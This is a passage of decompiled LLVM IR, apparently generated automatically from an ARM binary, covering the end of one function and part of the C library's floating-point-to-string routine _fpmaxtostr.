  store i8 45, i8* %v5_194a8, align 1
  %v6_194a8 = load i32, i32* %r8.global-to-local, align 4
  %v7_194a8 = add i32 %v6_194a8, -1
  store i32 %v7_194a8, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1949c..thread2_crit_edge, %bb26
  %v0_194ac = phi i32 [ %v0_194ac.pre, %dec_label_pc_1949c..thread2_crit_edge ], [ %v7_194a8, %bb26 ]
  ret i32 %v0_194ac

; uselistorder directives
  uselistorder i32 %v0_1947c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_19468, { 0, 6, 1, 2, 3, 5, 4 }
  uselistorder i8 %storemerge, { 1, 0 }
  uselistorder i32 %v0_19374, { 1, 0, 2 }
  uselistorder i32 %tmp21, { 0, 3, 2, 1 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i8 1, { 4, 1, 5, 0, 7, 8, 2, 3, 9, 6, 10, 11 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %dec_label_pc_19474, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_193a8, { 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, double %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %tmp = fptrunc double %arg2 to float
  %tmp160 = bitcast float %tmp to i32
  store i32 %tmp160, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %stack_var_-46 = alloca i8, align 1
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-47 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-82 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-83 = alloca i32, align 4
  %stack_var_-81 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %v27_194bc = load i32, i32* @lr, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_194c8 = add i32 %arg4, 8
  %v2_194c8 = inttoptr i32 %v1_194c8 to i8*
  %v3_194c8 = load i8, i8* %v2_194c8, align 1
  %v4_194c8 = zext i8 %v3_194c8 to i32
  store i32 %v4_194c8, i32* %sb.global-to-local, align 4
  %v1_194cc = or i32 %v4_194c8, 32
  %v7_194d0 = icmp eq i32 %v1_194cc, 97
  store i1 %v7_194d0, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg4, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_194e8 = inttoptr i32 %arg4 to i32*
  %v2_194e8 = load i32, i32* %v1_194e8, align 4
  store i32 %v2_194e8, i32* %fp.global-to-local, align 4
  store i32 %arg4, i32* %lr.global-to-local, align 4
  %v0_194f0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_194f0, i32* %r6.global-to-local, align 4
  store i32 65376, i32* %ip.global-to-local, align 4
  br i1 %v7_194d0, label %bb, label %bb201

bb:                                               ; preds = %entry
  %v2_194f8 = add nuw nsw i32 %v4_194c8, 6
  store i32 %v2_194f8, i32* %r3.global-to-local, align 4
  br label %bb201

bb201:                                            ; preds = %entry, %bb
  %v1_19508 = phi i32 [ %v0_194f0, %entry ], [ %v2_194f8, %bb ]
  store i32 %tmp160, i32* %r5.global-to-local, align 4
  %v1_19500 = add i32 %arg4, 12
  %v2_19500 = inttoptr i32 %v1_19500 to i32*
  %v3_19500 = load i32, i32* %v2_19500, align 4
  store i32 %v3_19500, i32* %r2.global-to-local, align 4
  %v1_19504 = add i32 %arg4, 4
  %v2_19504 = inttoptr i32 %v1_19504 to i32*
  %v3_19504 = load i32, i32* %v2_19504, align 4
  store i32 %v3_19504, i32* @lr, align 4
  br i1 %v7_194d0, label %bb202, label %bb203

bb202:                                            ; preds = %bb201
  %v2_19508 = urem i32 %v1_19508, 256
  store i32 %v2_19508, i32* %sb.global-to-local, align 4
  br label %bb203

bb203:                                            ; preds = %bb201, %bb202
  %v1_1950c = icmp slt i32 %v2_194e8, 0
  %v2_1950c = icmp eq i32 %v2_194e8, 0
  store i1 %v2_1950c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %ip.global-to-local, align 4
  br i1 %v1_1950c, label %bb204, label %bb205

bb204:                                            ; preds = %bb203
  store i32 6, i32* %fp.global-to-local, align 4
  br label %bb205

bb205:                                            ; preds = %bb203, %bb204
  %v1_1951c = and i32 %v3_19500, 2
  %v2_1951c = icmp eq i32 %v1_1951c, 0
  store i1 %v2_1951c, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-46, align 1
  br i1 %v2_1951c, label %dec_label_pc_19534, label %dec_label_pc_19540

dec_label_pc_19534:                               ; preds = %bb205
  %v1_19534 = urem i32 %v3_19500, 2
  %v2_19534 = icmp eq i32 %v1_19534, 0
  store i1 %v2_19534, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19534, label %dec_label_pc_19544, label %dec_label_pc_19540

dec_label_pc_19540:                               ; preds = %dec_label_pc_19534, %bb205
  %storemerge = phi i32 [ 43, %bb205 ], [ 32, %dec_label_pc_19534 ]
  %v0_19540.off0 = phi i8 [ 43, %bb205 ], [ 32, %dec_label_pc_19534 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i8 %v0_19540.off0, i8* %stack_var_-46, align 1
  br label %dec_label_pc_19544

dec_label_pc_19544:                               ; preds = %dec_label_pc_19534, %dec_label_pc_19540
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v0_194f0, i32* %r3.global-to-local, align 4
  store i32 %tmp160, i32* @r0, align 4
  store i32 %v0_194f0, i32* %r1.global-to-local, align 4
  store i32 %tmp160, i32* @r2, align 4
  %v1_19560 = fptrunc double %arg2 to float
  %v2_19560 = bitcast float %v1_19560 to i32
  %v9_19560 = call i32 @__aeabi_dcmpeq(i32 %v2_19560, i32 %v0_194f0, i32 %v2_19560, i32 %v0_194f0, i32 0)
  store i32 %v9_19560, i32* %r0.global-to-local, align 4
  %v2_19564 = icmp eq i32 %v9_19560, 0
  store i1 %v2_19564, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19564, label %bb207, label %dec_label_pc_19574

bb207:                                            ; preds = %dec_label_pc_19544
  store i32 8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_19628

dec_label_pc_19574:                               ; preds = %dec_label_pc_19544
  %v0_19574 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_19574, i32* @r0, align 4
  %v0_19578 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_19578, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_19584 = call i32 @__aeabi_dcmpeq(i32 %v0_19574, i32 %v0_19578, i32 0, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_19584, i32* %r0.global-to-local, align 4
  %v2_19588 = icmp eq i32 %v7_19584, 0
  store i1 %v2_19588, i1* %cpsr_z.global-to-local, align 1
  %v0_195d0 = load i32, i32* %r5.global-to-local, align 4
  %v1_195d0 = sext i32 %v0_195d0 to i64
  %v2_195d0 = bitcast i64 %v1_195d0 to double
  br i1 %v2_19588, label %dec_label_pc_195d0, label %dec_label_pc_19590

dec_label_pc_19590:                               ; preds = %dec_label_pc_19574
  store i32 1072693248, i32* %r1.global-to-local, align 4
  %v9_195a0 = fdiv double 0.000000e+00, %v2_195d0
  %v10_195a0 = fptrunc double %v9_195a0 to float
  %v11_195a0 = bitcast float %v10_195a0 to i32
  store i32 %v11_195a0, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_195ac = call i32 @__aeabi_dcmplt(i32 %v11_195a0, i32 1072693248, i32 0, i32 0)
  store i32 %v4_195ac, i32* %r0.global-to-local, align 4
  %v2_195b0 = icmp eq i32 %v4_195ac, 0
  store i1 %v2_195b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_195b0, label %bb208, label %dec_label_pc_195bc

bb208:                                            ; preds = %dec_label_pc_19590
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1979c

dec_label_pc_195bc:                               ; preds = %dec_label_pc_19590
  store i32 45, i32* %r3.global-to-local, align 4
  store i8 45, i8* %stack_var_-46, align 1
  br label %dec_label_pc_1979c

dec_label_pc_195d0:                               ; preds = %dec_label_pc_19574
  store i32 %v0_195d0, i32* @r0, align 4
  %v0_195d4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_195d4, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_195e0 = fptrunc double %v2_195d0 to float
  %v2_195e0 = bitcast float %v1_195e0 to i32
  %v6_195e0 = call i32 @__aeabi_dcmplt(i32 %v2_195e0, i32 %v0_195d4, i32 0, i32 0)
  store i32 %v6_195e0, i32* %r0.global-to-local, align 4
  %v2_195e4 = icmp eq i32 %v6_195e0, 0
  store i1 %v2_195e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_195e4, label %dec_label_pc_195d0..thread9_crit_edge, label %bb209

dec_label_pc_195d0..thread9_crit_edge:            ; preds = %dec_label_pc_195d0
  %v0_19604.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.thread9

bb209:                                            ; preds = %dec_label_pc_195d0
  store i32 45, i32* %r2.global-to-local, align 4
  %v1_195ec = load i32, i32* %r6.global-to-local, align 4
  %v2_195ec = sub i32 0, %v1_195ec
  store i32 %v2_195ec, i32* %r4.global-to-local, align 4
  store i8 45, i8* %stack_var_-46, align 1
  store i32 %v2_195ec, i32* %r6.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_195d0..thread9_crit_edge, %bb209
  %v0_19604 = phi i32 [ %v0_19604.pre, %dec_label_pc_195d0..thread9_crit_edge ], [ %v2_195ec, %bb209 ]
  %v0_19600 = load i32, i32* %r5.global-to-local, align 4
  %v1_19600 = sext i32 %v0_19600 to i64
  %v2_19600 = bitcast i64 %v1_19600 to double
  %v9_19608 = fmul double %v2_19600, 0.000000e+00
  %v10_19608 = fptrunc double %v9_19608 to float
  %v11_19608 = bitcast float %v10_19608 to i32
  store i32 %v11_19608, i32* @r2, align 4
  store i32 %v0_19604, i32* %r3.global-to-local, align 4
  store i32 %v0_19600, i32* @r0, align 4
  store i32 %v0_19604, i32* %r1.global-to-local, align 4
  %v7_1961c = call i32 @__aeabi_dcmpeq(i32 %v0_19600, i32 %v0_19604, i32 %v11_19608, i32 %v0_19604, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_1961c, i32* %r0.global-to-local, align 4
  %v2_19620 = icmp eq i32 %v7_1961c, 0
  store i1 %v2_19620, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19620, label %dec_label_pc_19674, label %.thread9.dec_label_pc_19628_crit_edge

.thread9.dec_label_pc_19628_crit_edge:            ; preds = %.thread9
  %v3_19628.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_19628

dec_label_pc_19628:                               ; preds = %bb207, %.thread9.dec_label_pc_19628_crit_edge
  %v3_19628 = phi i32 [ %v3_19628.pre, %.thread9.dec_label_pc_19628_crit_edge ], [ %arg4, %bb207 ]
  %v1_1956c.v0_195585 = phi i32 [ 0, %.thread9.dec_label_pc_19628_crit_edge ], [ 8, %bb207 ]
  store i32 %v3_19628, i32* %ip.global-to-local, align 4
  %v2_19630 = add i32 %v3_19628, 16
  %v3_19630 = inttoptr i32 %v2_19630 to i32*
  store i32 32, i32* %v3_19630, align 4
  %v0_19638 = load i32, i32* %sb.global-to-local, align 4
  %v7_19638 = icmp eq i32 %v0_19638, 96
  store i1 %v7_19638, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-164, align 4
  %tmp274 = icmp ult i32 %v0_19638, 97
  br i1 %tmp274, label %bb210, label %.thread124

bb210:                                            ; preds = %dec_label_pc_19628
  %v5_1964c = or i32 %v1_1956c.v0_195585, 4
  store i32 %v5_1964c, i32* %r3.global-to-local, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_19628, %bb210
  %v4_19650 = phi i32 [ %v5_1964c, %bb210 ], [ 3, %dec_label_pc_19628 ]
  %v4_19650.v1_1956c.v0_19558 = select i1 %tmp274, i32 %v4_19650, i32 %v1_1956c.v0_195585
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %lr.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -33052), i32* %r3.global-to-local, align 4
  %v2_19664 = add i32 %v4_19650.v1_1956c.v0_19558, add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -33052)
  store i32 %v2_19664, i32* %r2.global-to-local, align 4
  %v2_19668 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_19668, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_19b90

dec_label_pc_19674:                               ; preds = %.thread9
  %v0_19674 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_19674, i32* %r1.global-to-local, align 4
  store i32 1100470148, i32* %r3.global-to-local, align 4
  %v0_1967c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1967c, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  %v6_19684 = call i32 @__aeabi_dcmplt(i32 %v0_1967c, i32 %v0_19674, i32 0, i32 1100470148)
  store i32 %v6_19684, i32* %r0.global-to-local, align 4
  %v2_19688 = icmp eq i32 %v6_19684, 0
  store i1 %v2_19688, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19688, label %bb212, label %bb211

bb211:                                            ; preds = %dec_label_pc_19674
  store i32 1, i32* %r0.global-to-local, align 4
  br label %bb212

bb212:                                            ; preds = %dec_label_pc_19674, %bb211
  %v0_19690 = phi i32 [ 0, %dec_label_pc_19674 ], [ 1, %bb211 ]
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -33028), i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -33028), i32* %stack_var_-208, align 4
  store i32 9, i32* %sl.global-to-local, align 4
  store i32 256, i32* %r4.global-to-local, align 4
  %v2_196c4 = icmp eq i32 %v0_19690, 0
  br label %dec_label_pc_196b4

dec_label_pc_196b4:                               ; preds = %dec_label_pc_1974c.dec_label_pc_196b4_crit_edge, %bb212
  %v2_196bc = phi i32 [ add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -33028), %bb212 ], [ %v2_196bc.pre, %dec_label_pc_1974c.dec_label_pc_196b4_crit_edge ]
  %v0_196b8 = phi i32 [ 9, %bb212 ], [ %v0_1974c, %dec_label_pc_1974c.dec_label_pc_196b4_crit_edge ]
  %v2_196fc = phi i32 [ 8, %bb212 ], [ %stack_var_-192.3, %dec_label_pc_1974c.dec_label_pc_196b4_crit_edge ]
  store i32 %v0_19690, i32* %r2.global-to-local, align 4
  %v1_196b8 = add i32 %v0_196b8, -1
  store i32 %v1_196b8, i32* %sl.global-to-local, align 4
  store i32 %v2_196bc, i32* @lr, align 4
  %v3_196c0 = mul i32 %v1_196b8, 8
  store i32 %v3_196c0, i32* %r3.global-to-local, align 4
  store i1 %v2_196c4, i1* %cpsr_z.global-to-local, align 1
  %v0_196c8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_196c8, i32* %r0.global-to-local, align 4
  %v0_196cc = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_196cc, i32* %r1.global-to-local, align 4
  %v2_196d0 = add i32 %v3_196c0, %v2_196bc
  store i32 %v2_196d0, i32* %ip.global-to-local, align 4
  %v1_1970c = inttoptr i32 %v2_196d0 to i32*
  %v2_1970c = load i32, i32* %v1_1970c, align 4
  %v3_1970c = sext i32 %v2_1970c to i64
  %v1_19710 = sext i32 %v0_196c8 to i64
  %v2_19710 = bitcast i64 %v1_19710 to double
  br i1 %v2_196c4, label %dec_label_pc_1970c, label %dec_label_pc_196d8

dec_label_pc_196d8:                               ; preds = %dec_label_pc_196b4
  %v8_196dc = bitcast i64 %v3_1970c to double
  %v9_196dc = fmul double %v2_19710, %v8_196dc
  %v10_196dc = fptrunc double %v9_196dc to float
  %v11_196dc = bitcast float %v10_196dc to i32
  store i32 %v11_196dc, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  store i32 %v11_196dc, i32* %r7.global-to-local, align 4
  store i32 %v0_196cc, i32* %r8.global-to-local, align 4
  %v4_196f0 = call i32 @__aeabi_dcmplt(i32 %v11_196dc, i32 %v0_196cc, i32 0, i32 1104006501)
  store i32 %v4_196f0, i32* %r0.global-to-local, align 4
  %v2_196f4 = icmp eq i32 %v4_196f0, 0
  store i1 %v2_196f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_196f4, label %dec_label_pc_1974c, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_196d8
  %v1_196fc = load i32, i32* %r4.global-to-local, align 4
  %v3_196fc = sub i32 %v2_196fc, %v1_196fc
  store i32 %v3_196fc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19744

dec_label_pc_1970c:                               ; preds = %dec_label_pc_196b4
  store i32 %v0_196cc, i32* @r1, align 4
  %v8_19718 = bitcast i64 %v3_1970c to double
  %v9_19718 = fdiv double %v2_19710, %v8_19718
  %v10_19718 = fptrunc double %v9_19718 to float
  %v11_19718 = bitcast float %v10_19718 to i32
  store i32 %v11_19718, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 1100470148, i32* @r3, align 4
  store i32 %v11_19718, i32* %r7.global-to-local, align 4
  store i32 %v0_196cc, i32* %r8.global-to-local, align 4
  %v4_1972c = call i32 @__aeabi_dcmpge(i32 %v11_19718, i32 %v0_196cc, i32 0, i32 1100470148)
  store i32 %v4_1972c, i32* %r0.global-to-local, align 4
  %v2_19730 = icmp eq i32 %v4_1972c, 0
  store i1 %v2_19730, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19730, label %dec_label_pc_1974c, label %dec_label_pc_19738

dec_label_pc_19738:                               ; preds = %dec_label_pc_1970c
  %v1_1973c = load i32, i32* %r4.global-to-local, align 4
  %v2_1973c = add i32 %v1_1973c, %v2_196fc
  store i32 %v2_1973c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19744

dec_label_pc_19744:                               ; preds = %.thread10, %dec_label_pc_19738
  %stack_var_-192.2 = phi i32 [ %v2_1973c, %dec_label_pc_19738 ], [ %v3_196fc, %.thread10 ]
  %v0_19744 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_19744, i32* %r5.global-to-local, align 4
  %v0_19748 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_19748, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1974c

dec_label_pc_1974c:                               ; preds = %dec_label_pc_196d8, %dec_label_pc_1970c, %dec_label_pc_19744
  %stack_var_-192.3 = phi i32 [ %v2_196fc, %dec_label_pc_1970c ], [ %stack_var_-192.2, %dec_label_pc_19744 ], [ %v2_196fc, %dec_label_pc_196d8 ]
  %v0_1974c = load i32, i32* %sl.global-to-local, align 4
  %v2_1974c = icmp eq i32 %v0_1974c, 0
  store i1 %v2_1974c, i1* %cpsr_z.global-to-local, align 1
  %v0_19750 = load i32, i32* %r4.global-to-local, align 4
  %v3_19750 = sdiv i32 %v0_19750, 2
  store i32 %v3_19750, i32* %r4.global-to-local, align 4
  br i1 %v2_1974c, label %dec_label_pc_19758, label %dec_label_pc_1974c.dec_label_pc_196b4_crit_edge

dec_label_pc_1974c.dec_label_pc_196b4_crit_edge:  ; preds = %dec_label_pc_1974c
  %v2_196bc.pre = load i32, i32* %stack_var_-208, align 4
  br label %dec_label_pc_196b4

dec_label_pc_19758:                               ; preds = %dec_label_pc_1974c
  %v0_19758 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_19758, i32* @r0, align 4
  %v0_1975c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1975c, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  store i32 1104006501, i32* @r3, align 4
  %v6_19768 = call i32 @__aeabi_dcmpge(i32 %v0_19758, i32 %v0_1975c, i32 0, i32 1104006501)
  store i32 %v6_19768, i32* %r0.global-to-local, align 4
  %v2_1976c = icmp eq i32 %v6_19768, 0
  store i1 %v2_1976c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1976c, label %dec_label_pc_1979c, label %dec_label_pc_19774

dec_label_pc_19774:                               ; preds = %dec_label_pc_19758
  %v0_19774 = load i32, i32* %r5.global-to-local, align 4
  %v1_19774 = sext i32 %v0_19774 to i64
  %v2_19774 = bitcast i64 %v1_19774 to double
  %v0_19778 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_19778, i32* %r1.global-to-local, align 4
  store i32 1076101120, i32* %r3.global-to-local, align 4
  %v9_19784 = fdiv double %v2_19774, 0.000000e+00
  %v10_19784 = fptrunc double %v9_19784 to float
  %v11_19784 = bitcast float %v10_19784 to i32
  store i32 %v11_19784, i32* %r0.global-to-local, align 4
  store i32 %v11_19784, i32* %r5.global-to-local, align 4
  %v1_19794 = add i32 %stack_var_-192.3, 1
  store i32 %v1_19794, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1979c

dec_label_pc_1979c:                               ; preds = %dec_label_pc_19774, %bb208, %dec_label_pc_19758, %dec_label_pc_195bc
  %stack_var_-192.4 = phi i32 [ %stack_var_-192.3, %dec_label_pc_19758 ], [ -1, %dec_label_pc_195bc ], [ -1, %bb208 ], [ %v1_19794, %dec_label_pc_19774 ]
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_197a0 = ptrtoint i32* %stack_var_-81 to i32
  store i32 %v2_197a0, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_197a4

dec_label_pc_197a4:                               ; preds = %dec_label_pc_1981c, %dec_label_pc_1979c
  %v0_197a4 = load i32, i32* %r6.global-to-local, align 4
  %v0_197a8 = load i32, i32* %r5.global-to-local, align 4
  %v1_197ac = sext i32 %v0_197a8 to i64
  %v2_197ac = bitcast i64 %v1_197ac to double
  %v3_197ac = fptoui double %v2_197ac to i32
  store i32 %v3_197ac, i32* %r8.global-to-local, align 4
  store i32 %v3_197ac, i32* %r2.global-to-local, align 4
  store i32 %v0_197a4, i32* %r3.global-to-local, align 4
  store i32 %v0_197a8, i32* @r0, align 4
  store i32 %v0_197a4, i32* %r1.global-to-local, align 4
  %v6_197c8 = call i32 @__aeabi_dsub(i32 %v0_197a8, i32 %v0_197a4, i32 %v3_197ac, i32 %v0_197a4)
  %v7_197c8 = sext i32 %v6_197c8 to i64
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  %v3_197d4 = bitcast i64 %v7_197c8 to double
  %v9_197d4 = fmul double %v3_197d4, 0.000000e+00
  %v10_197d4 = fptrunc double %v9_197d4 to float
  %v11_197d4 = bitcast float %v10_197d4 to i32
  store i32 %v11_197d4, i32* %r0.global-to-local, align 4
  %v0_197d8 = load i32, i32* %sl.global-to-local, align 4
  %v1_197d8 = add i32 %v0_197d8, 9
  store i32 %v1_197d8, i32* %sl.global-to-local, align 4
  store i32 %v11_197d4, i32* %r5.global-to-local, align 4
  store i32 %v0_197a4, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_197e8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_197e8

dec_label_pc_197e8:                               ; preds = %dec_label_pc_197e8.dec_label_pc_197e8_crit_edge, %dec_label_pc_197a4
  %v1_197fc = phi i32 [ %v1_197fc.pre, %dec_label_pc_197e8.dec_label_pc_197e8_crit_edge ], [ %v1_197d8, %dec_label_pc_197a4 ]
  %v0_197f4 = phi i32 [ %v0_19810, %dec_label_pc_197e8.dec_label_pc_197e8_crit_edge ], [ 0, %dec_label_pc_197a4 ]
  %v0_19800 = phi i32 [ %v2_1980c, %dec_label_pc_197e8.dec_label_pc_197e8_crit_edge ], [ %v0_197e8.pre, %dec_label_pc_197a4 ]
  %v3_197f0 = urem i32 %v0_19800, 10
  %v1_197f4 = add i32 %v0_197f4, 1
  store i32 %v1_197f4, i32* %r7.global-to-local, align 4
  %v1_197f8 = or i32 %v3_197f0, 48
  store i32 %v1_197f8, i32* %r2.global-to-local, align 4
  %v2_197fc = sub i32 %v1_197fc, %v1_197f4
  store i32 %v2_197fc, i32* %r3.global-to-local, align 4
  store i32 %v0_19800, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_19808 = trunc i32 %v1_197f8 to i8
  %v3_19808 = inttoptr i32 %v2_197fc to i8*
  store i8 %v1_19808, i8* %v3_19808, align 1
  %v0_1980c = load i32, i32* %r0.global-to-local, align 4
  %v1_1980c = load i32, i32* %r1.global-to-local, align 4
  %v2_1980c = udiv i32 %v0_1980c, %v1_1980c
  store i32 %v2_1980c, i32* %r0.global-to-local, align 4
  %v0_19810 = load i32, i32* %r7.global-to-local, align 4
  %v7_19810 = icmp eq i32 %v0_19810, 8
  store i1 %v7_19810, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_1980c, i32* %r8.global-to-local, align 4
  %v7_19818 = icmp slt i32 %v0_19810, 9
  br i1 %v7_19818, label %dec_label_pc_197e8.dec_label_pc_197e8_crit_edge, label %dec_label_pc_1981c

dec_label_pc_197e8.dec_label_pc_197e8_crit_edge:  ; preds = %dec_label_pc_197e8
  %v1_197fc.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_197e8

dec_label_pc_1981c:                               ; preds = %dec_label_pc_197e8
  %v0_1981c = load i32, i32* %r4.global-to-local, align 4
  %v1_1981c = add i32 %v0_1981c, 1
  store i32 %v1_1981c, i32* %r4.global-to-local, align 4
  %v7_19820 = icmp eq i32 %v0_1981c, 0
  store i1 %v7_19820, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19820, label %dec_label_pc_197a4, label %dec_label_pc_19828

dec_label_pc_19828:                               ; preds = %dec_label_pc_1981c
  %v0_19828 = load i32, i32* %sb.global-to-local, align 4
  %v7_19828 = icmp eq i32 %v0_19828, 96
  store i1 %v7_19828, i1* %cpsr_z.global-to-local, align 1
  %tmp275 = icmp ult i32 %v0_19828, 97
  br i1 %tmp275, label %bb213, label %thread-pre-split

bb213:                                            ; preds = %dec_label_pc_19828
  %v5_19838 = add i32 %v0_19828, 32
  store i32 %v5_19838, i32* %r3.global-to-local, align 4
  %v5_1983c = urem i32 %v5_19838, 256
  store i32 %v5_1983c, i32* %sb.global-to-local, align 4
  br label %bb214

thread-pre-split:                                 ; preds = %dec_label_pc_19828
  %v4_19834.pre129134 = load i32, i32* %r3.global-to-local, align 4
  %phitmp = urem i32 %v4_19834.pre129134, 256
  br label %bb214

bb214:                                            ; preds = %thread-pre-split, %bb213
  %v4_19834126130 = phi i32 [ %phitmp, %thread-pre-split ], [ 69, %bb213 ]
  %v0_1985c = phi i32 [ %v0_19828, %thread-pre-split ], [ %v5_1983c, %bb213 ]
  %v7_19840 = icmp eq i32 %v0_1985c, 103
  %. = zext i1 %v7_19840 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_1984c = load i32, i32* %fp.global-to-local, align 4
  %v2_1984c = icmp eq i32 %v0_1984c, 0
  store i1 %v2_1984c, i1* %cpsr_z.global-to-local, align 1
  %tmp217 = icmp slt i32 %v0_1984c, 1
  br i1 %tmp217, label %.thread16, label %bb218

.thread16:                                        ; preds = %bb214
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb220

bb218:                                            ; preds = %bb214
  %v2_19854 = icmp eq i1 %v7_19840, false
  store i1 %v2_19854, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19854, label %bb220, label %bb219

bb219:                                            ; preds = %bb218
  %v2_19858 = add i32 %v0_1984c, -1
  store i32 %v2_19858, i32* %fp.global-to-local, align 4
  br label %bb220

